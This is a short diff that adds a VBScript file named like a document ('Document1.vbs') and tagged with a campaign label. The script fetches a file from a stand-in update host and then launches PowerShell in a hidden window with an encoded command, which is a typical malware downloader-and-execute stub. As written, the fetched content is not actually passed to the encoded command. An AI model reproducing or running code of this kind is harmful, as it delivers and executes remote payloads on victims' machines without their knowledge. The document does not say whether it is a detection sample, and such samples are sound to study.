@@ -1,0 +1,7 @@
+' Document1.vbs
+Const CAMPAIGN = "NJ-CAMPAIGN-0x5A"
+Set sh = CreateObject("WScript.Shell")
+Set xhr = CreateObject("MSXML2.XMLHTTP")
+xhr.Open "GET", "http://cdn.nightjar-update.example/a.txt", False
+xhr.Send
+sh.Run "powershell -nop -w hidden -enc SQBFAFgAIAA=", 0, False
